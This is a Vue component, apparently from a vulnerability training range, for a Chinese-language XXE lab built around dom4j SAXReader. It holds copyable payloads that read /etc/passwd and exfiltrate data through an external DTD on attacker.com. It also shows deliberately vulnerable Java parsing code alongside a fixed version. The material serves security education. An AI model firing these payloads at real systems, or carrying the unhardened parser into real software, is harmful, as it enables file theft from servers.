<template>
  <vuln-template
    title="应用配置管理系统 - SAX 读取器"
    subtitle="外部实体注入"
    level="高危"
    :icon="SettingOutlined"
    moduleKey="xxe_saxreader"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>业务场景：</strong>企业应用配置管理平台,支持导入XML格式的应用配置文件,实现配置的批量管理和分发。系统支持文件上传和在线编辑两种方式,方便运维人员快速部署配置。
      </a-typography-paragraph>
      <a-typography-paragraph>
        <strong>漏洞原理：</strong>系统使用SAXReader(dom4j库)解析配置文件,未禁用外部实体解析,攻击者可以通过构造恶意配置文件读取服务器敏感信息。
      </a-typography-paragraph>
      <a-alert
        message="⚠️ 安全提示"
        description="本系统仅用于安全学习。dom4j是Java中常用的XML解析库,默认配置存在XXE风险,在生产环境中必须禁用外部实体。"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #payload>
      <a-tabs v-model:activeKey="payloadTab" type="card">
        <a-tab-pane key="normal" tab="正常配置">
          <a-typography-paragraph>
            <strong>正常的应用配置XML示例：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;config&gt;
  &lt;app&gt;
    &lt;name&gt;UserService&lt;/name&gt;
    &lt;port&gt;8080&lt;/port&gt;
    &lt;database&gt;mysql://localhost:3306/db&lt;/database&gt;
  &lt;/app&gt;
&lt;/config&gt;
          </a-typography-paragraph>
        </a-tab-pane>

        <a-tab-pane key="file" tab="文件读取攻击">
          <a-typography-paragraph>
            <strong>攻击Payload - 读取应用配置文件：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE config [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;config&gt;
  &lt;app&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
  &lt;/app&gt;
&lt;/config&gt;
          </a-typography-paragraph>
          <a-alert
            message="攻击原理：通过DOCTYPE声明外部实体,可以读取服务器上的敏感配置文件、密钥文件等。"
            type="info"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>

        <a-tab-pane key="blind" tab="盲注攻击">
          <a-typography-paragraph>
            <strong>攻击Payload - OOB数据外带：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE config [
  &lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
  &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
  %dtd;
]&gt;
&lt;config&gt;
  &lt;app&gt;
    &lt;name&gt;test&lt;/name&gt;
  &lt;/app&gt;
&lt;/config&gt;
          </a-typography-paragraph>
          <a-alert
            message="攻击原理：当无法直接回显时,通过外部DTD将数据外带到攻击者服务器。"
            type="info"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>
      </a-tabs>
    </template>

    <template #test-form>
      <div class="config-system-container">
        <!-- 系统头部 -->
        <div class="system-header">
          <div class="header-icon">
            <setting-outlined />
          </div>
          <div class="header-content">
            <h3>应用配置管理平台</h3>
            <p>支持XML格式的应用配置文件导入与管理 | 已管理 {{ configHistory.length }} 个配置</p>
          </div>
          <div class="header-stats">
            <a-statistic title="配置数量" :value="configHistory.length" suffix="个" />
          </div>
        </div>

        <!-- 快捷操作 -->
        <a-row :gutter="16" style="margin-bottom: 24px;">
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('normal')">
              <div class="action-icon" style="background: linear-gradient(135deg, #1890ff 0%, #69c0ff 100%);">
                <file-text-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">正常配置</div>
                <div class="action-desc">加载正常配置示例</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('file')">
              <div class="action-icon" style="background: linear-gradient(135deg, #fa8c16 0%, #ffc53d 100%);">
                <folder-open-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">文件读取</div>
                <div class="action-desc">XXE文件读取攻击</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('blind')">
              <div class="action-icon" style="background: linear-gradient(135deg, #f5222d 0%, #ff7875 100%);">
                <export-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">盲注攻击</div>
                <div class="action-desc">OOB数据外带</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="showHistory = !showHistory">
              <div class="action-icon" style="background: linear-gradient(135deg, #722ed1 0%, #b37feb 100%);">
                <history-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">配置历史</div>
                <div class="action-desc">查看历史记录</div>
              </div>
            </a-card>
          </a-col>
        </a-row>

        <!-- 配置历史记录 -->
        <a-card v-if="showHistory" title="📜 配置历史记录" :bordered="false" class="history-card" style="margin-bottom: 24px;">
          <a-table
            :columns="historyColumns"
            :data-source="configHistory"
            :pagination="{ pageSize: 5 }"
            size="small"
          >
            <template #bodyCell="{ column, record }">
              <template v-if="column.key === 'status'">
                <a-tag :color="record.status === 'success' ? 'success' : 'error'">
                  {{ record.status === 'success' ? '成功' : '失败' }}
                </a-tag>
              </template>
              <template v-if="column.key === 'action'">
                <a-button type="link" size="small" @click="loadHistoryItem(record)">
                  查看
                </a-button>
              </template>
            </template>
          </a-table>
        </a-card>

        <!-- 导入表单 -->
        <a-card title="⚙️ 配置文件内容" :bordered="false" class="import-card">
          <template #extra>
            <a-space>
              <a-tag color="blue">dom4j SAXReader</a-tag>
              <a-radio-group v-model:value="importMode" button-style="solid" size="small">
                <a-radio-button value="text">在线编辑</a-radio-button>
                <a-radio-button value="file">文件上传</a-radio-button>
              </a-radio-group>
            </a-space>
          </template>

          <!-- 文件上传模式 -->
          <div v-if="importMode === 'file'" class="upload-section">
            <a-upload-dragger
              :before-upload="handleFileUpload"
              :show-upload-list="false"
              accept=".xml"
            >
              <p class="ant-upload-drag-icon">
                <inbox-outlined style="font-size: 48px; color: #1890ff;" />
              </p>
              <p class="ant-upload-text">点击或拖拽XML配置文件到此区域上传</p>
              <p class="ant-upload-hint">
                支持单个XML文件上传,文件大小不超过10MB
              </p>
            </a-upload-dragger>
            <div v-if="uploadedFileName" class="uploaded-file-info">
              <a-alert
                :message="`已选择文件: ${uploadedFileName}`"
                type="success"
                show-icon
                closable
                @close="clearUploadedFile"
              />
            </div>
          </div>

          <!-- 在线编辑模式 -->
          <a-form v-else :model="formState" @finish="handleSubmit" layout="vertical">
            <a-form-item
              label="XML配置内容"
              name="content"
              :rules="[{ required: true, message: '请输入XML配置数据' }]"
            >
              <a-textarea
                v-model:value="formState.content"
                :rows="12"
                placeholder="请粘贴或输入XML格式的应用配置..."
                class="xml-textarea"
              />
            </a-form-item>

            <!-- 配置预览 -->
            <a-form-item v-if="formState.content" label="配置预览">
              <div class="data-preview">
                <a-descriptions :column="2" size="small" bordered>
                  <a-descriptions-item label="配置大小">
                    {{ (formState.content.length / 1024).toFixed(2) }} KB
                  </a-descriptions-item>
                  <a-descriptions-item label="行数">
                    {{ formState.content.split('\n').length }} 行
                  </a-descriptions-item>
                  <a-descriptions-item label="包含DOCTYPE" :span="2">
                    <a-tag :color="formState.content.includes('<!DOCTYPE') ? 'warning' : 'success'">
                      {{ formState.content.includes('<!DOCTYPE') ? '是 ⚠️' : '否' }}
                    </a-tag>
                  </a-descriptions-item>
                </a-descriptions>
              </div>
            </a-form-item>

            <a-form-item>
              <a-space size="large">
                <a-button type="primary" html-type="submit" size="large" :loading="loading">
                  <template #icon><cloud-upload-outlined /></template>
                  导入配置
                </a-button>
                <a-button size="large" @click="handleReset">
                  <template #icon><redo-outlined /></template>
                  清空
                </a-button>
              </a-space>
            </a-form-item>
          </a-form>
        </a-card>
      </div>
    </template>

    <template #result v-if="result">
      <a-card title="📋 解析结果" :bordered="false" class="result-card">
        <div class="result-content">
          <pre>{{ result }}</pre>
        </div>
        <a-alert
          v-if="result && (result.includes('root:') || result.includes('解析结果'))"
          message="⚠️ 检测到XXE漏洞"
          description="SAXReader成功解析了外部实体,返回了敏感文件内容。dom4j默认配置存在XXE风险,必须显式禁用外部实体。"
          type="error"
          show-icon
          style="margin-top: 16px"
        />
      </a-card>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/xxe")
public class XXE {
    @PostMapping(value = "/saxreader")
    public String SAXReader(@RequestBody String content, String entity) {
        try {
            // 漏洞：安全检测是可选的，默认不启用
            if (entity != null && entity.equals("true") && Security.checkXXE(content)) {
                return "检测到XXE攻击";
            }

            // 漏洞：创建SAXReader时没有禁用外部实体
            SAXReader sax = new SAXReader();
            // 修复代码被注释掉了：
            // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

            // 解析XML，如果XML包含外部实体引用，会加载外部资源
            org.dom4j.Document document = sax.read(new InputSource(new StringReader(content)));
            String text = document.getRootElement().getText();
            return "解析结果: " + text;
        } catch (Exception e) {
            return "错误: " + e.toString();
        }
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：SAXReader（dom4j库）默认允许加载外部实体,攻击者可以通过DOCTYPE声明和ENTITY引用加载本地文件或远程资源。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>禁用外部实体：</strong>设置SAXReader的setFeature禁用外部实体</li>
        <li><strong>禁用DOCTYPE：</strong>禁止DOCTYPE声明</li>
        <li><strong>升级dom4j版本：</strong>使用较新版本的dom4j(2.1.3+),默认禁用外部实体</li>
        <li><strong>输入验证：</strong>在解析前检查XML是否包含DOCTYPE声明</li>
      </ul>

      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例：禁用外部实体
@PostMapping(value = "/saxreader")
public String SAXReader(@RequestBody String content) {
    try {
        SAXReader sax = new SAXReader();

        // 禁用DOCTYPE声明
        sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // 禁用外部通用实体
        sax.setFeature("http://xml.org/sax/features/external-general-entities", false);

        // 禁用外部参数实体
        sax.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // 禁用外部DTD
        sax.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        org.dom4j.Document document = sax.read(new InputSource(new StringReader(content)));
        String text = document.getRootElement().getText();
        return "解析结果: " + text;
    } catch (Exception e) {
        return "错误: " + e.getMessage();
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import {
  SettingOutlined,
  FileTextOutlined,
  RedoOutlined,
  CloudUploadOutlined,
  FolderOpenOutlined,
  ExportOutlined,
  HistoryOutlined,
  InboxOutlined
} from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')
const payloadTab = ref('normal')
const importMode = ref('text')
const showHistory = ref(false)
const uploadedFileName = ref('')
const configHistory = ref([])

const historyColumns = [
  { title: '时间', dataIndex: 'time', key: 'time', width: 180 },
  { title: '配置名称', dataIndex: 'name', key: 'name' },
  { title: '状态', dataIndex: 'status', key: 'status', width: 80 },
  { title: '操作', key: 'action', width: 80 }
]

const examples = {
  normal: `<?xml version="1.0" encoding="UTF-8"?>
<config>
  <app>
    <name>UserService</name>
    <port>8080</port>
    <database>mysql://localhost:3306/db</database>
  </app>
</config>`,
  file: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<config>
  <app>
    <name>&xxe;</name>
  </app>
</config>`,
  blind: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE config [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<config>
  <app>
    <name>test</name>
  </app>
</config>`
}

const sourceCode = `@RestController
@RequestMapping("/home/xxe")
public class XXE {
    @PostMapping(value = "/saxreader")
    public String SAXReader(@RequestBody String content, String entity) {
        try {
            // 漏洞：安全检测是可选的，默认不启用
            if (entity != null && entity.equals("true") && Security.checkXXE(content)) {
                return "检测到XXE攻击";
            }

            // 漏洞：创建SAXReader时没有禁用外部实体
            SAXReader sax = new SAXReader();
            // 修复代码被注释掉了：
            // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

            // 解析XML，如果XML包含外部实体引用，会加载外部资源
            org.dom4j.Document document = sax.read(new InputSource(new StringReader(content)));
            String text = document.getRootElement().getText();
            return "解析结果: " + text;
        } catch (Exception e) {
            return "错误: " + e.toString();
        }
    }
}`

const fixCode = `// 正确示例：禁用外部实体
@PostMapping(value = "/saxreader")
public String SAXReader(@RequestBody String content) {
    try {
        SAXReader sax = new SAXReader();

        // 禁用DOCTYPE声明
        sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

        // 禁用外部通用实体
        sax.setFeature("http://xml.org/sax/features/external-general-entities", false);

        // 禁用外部参数实体
        sax.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        // 禁用外部DTD
        sax.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        org.dom4j.Document document = sax.read(new InputSource(new StringReader(content)));
        String text = document.getRootElement().getText();
        return "解析结果: " + text;
    } catch (Exception e) {
        return "错误: " + e.getMessage();
    }
}`

const formState = reactive({
  content: ''
})

const loadExample = (type) => {
  formState.content = examples[type]
  payloadTab.value = type
  importMode.value = 'text'
  message.success(`已加载${type === 'normal' ? '正常配置' : type === 'file' ? '文件读取攻击' : '盲注攻击'}示例`)
}

const handleFileUpload = (file) => {
  const isXML = file.type === 'text/xml' || file.name.endsWith('.xml')
  if (!isXML) {
    message.error('只能上传XML文件!')
    return false
  }

  const isLt10M = file.size / 1024 / 1024 < 10
  if (!isLt10M) {
    message.error('文件大小不能超过10MB!')
    return false
  }

  uploadedFileName.value = file.name

  const reader = new FileReader()
  reader.onload = (e) => {
    formState.content = e.target.result
    message.success('文件读取成功,请点击导入按钮')
    setTimeout(() => {
      handleSubmit()
    }, 500)
  }
  reader.readAsText(file)

  return false
}

const clearUploadedFile = () => {
  uploadedFileName.value = ''
  formState.content = ''
}

const handleSubmit = async () => {
  if (!formState.content) {
    message.error('请先选择文件或输入XML内容')
    return
  }

  loading.value = true
  try {
    const response = await axios.post('/home/xxe/saxreader', formState.content, {
      headers: {
        'Content-Type': 'application/xml'
      }
    })
    result.value = response.data

    configHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      name: uploadedFileName.value || '在线编辑',
      status: 'success',
      content: formState.content,
      result: response.data
    })

    message.success('导入完成')
  } catch (error) {
    const errorMsg = error.response?.data || error.message
    result.value = typeof errorMsg === 'string' ? errorMsg : JSON.stringify(errorMsg)

    configHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      name: uploadedFileName.value || '在线编辑',
      status: 'error',
      content: formState.content,
      result: result.value
    })

    message.error('导入失败')
  } finally {
    loading.value = false
  }
}

const loadHistoryItem = (record) => {
  formState.content = record.content
  result.value = record.result
  importMode.value = 'text'
  showHistory.value = false
  message.info('已加载历史记录')
}

const handleReset = () => {
  formState.content = ''
  result.value = ''
  uploadedFileName.value = ''
}
</script>

<style scoped>
.config-system-container {
  width: 100%;
}

.system-header {
  display: flex;
  align-items: center;
  padding: 32px;
  background: linear-gradient(135deg, #1890ff 0%, #096dd9 100%);
  border-radius: 16px;
  color: white;
  margin-bottom: 24px;
  box-shadow: 0 8px 32px rgba(24, 144, 255, 0.3);
}

.header-icon {
  width: 80px;
  height: 80px;
  background: rgba(255, 255, 255, 0.2);
  backdrop-filter: blur(10px);
  border-radius: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 40px;
  margin-right: 24px;
}

.header-content {
  flex: 1;
}

.header-content h3 {
  margin: 0 0 8px 0;
  font-size: 28px;
  font-weight: 700;
  color: white;
}

.header-content p {
  margin: 0;
  font-size: 16px;
  opacity: 0.9;
}

.header-stats {
  margin-left: 24px;
}

.header-stats :deep(.ant-statistic-title) {
  color: rgba(255, 255, 255, 0.85);
}

.header-stats :deep(.ant-statistic-content) {
  color: white;
  font-size: 24px;
}

.quick-action-card {
  cursor: pointer;
  transition: all 0.3s ease;
  border-radius: 12px;
}

.quick-action-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
}

.quick-action-card :deep(.ant-card-body) {
  padding: 20px;
  display: flex;
  align-items: center;
  gap: 16px;
}

.action-icon {
  width: 56px;
  height: 56px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  color: white;
  flex-shrink: 0;
}

.action-content {
  flex: 1;
}

.action-title {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.action-desc {
  font-size: 13px;
  color: #95a5a6;
}

.history-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  animation: slideDown 0.3s ease;
}

@keyframes slideDown {
  from {
    opacity: 0;
    transform: translateY(-10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.import-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
}

.import-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #e6f7ff 0%, #bae7ff 100%);
  border-bottom: 2px solid #91d5ff;
  font-weight: 600;
}

.upload-section {
  padding: 20px 0;
}

.uploaded-file-info {
  margin-top: 16px;
}

.data-preview {
  margin-top: 12px;
}

.xml-textarea {
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.6;
}

.result-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  margin-top: 24px;
}

.result-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #fff7e6 0%, #fffbe6 100%);
  border-bottom: 2px solid #ffe58f;
  font-weight: 600;
}

.result-content {
  background: #f6f8fa;
  border-radius: 8px;
  padding: 16px;
  border: 1px solid #e1e4e8;
}

.result-content pre {
  margin: 0;
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.6;
  color: #24292e;
  white-space: pre-wrap;
  word-wrap: break-word;
}
</style>
